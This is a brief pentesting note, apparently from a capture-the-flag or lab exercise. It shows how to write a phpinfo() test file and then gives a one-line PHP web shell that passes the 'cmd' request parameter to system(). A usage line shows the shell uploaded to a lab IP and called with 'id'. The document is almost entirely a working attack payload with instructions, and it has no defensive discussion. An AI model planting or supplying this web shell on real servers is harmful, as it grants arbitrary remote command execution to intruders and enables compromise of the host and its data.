PHP info test

Let us create a PHP file with the phpinfo() function, which outputs the configurational information of the PHP installation. 

```
echo "<?php phpinfo(); ?>" > test.php
```

---

php webshell

```
<?php echo system($_REQUEST['cmd']);?>
```

Write 
```
?cmd=[cmd]
``` 
at the back of the url

http://10.129.1.115/_uploaded/webshell.php?cmd=id
---
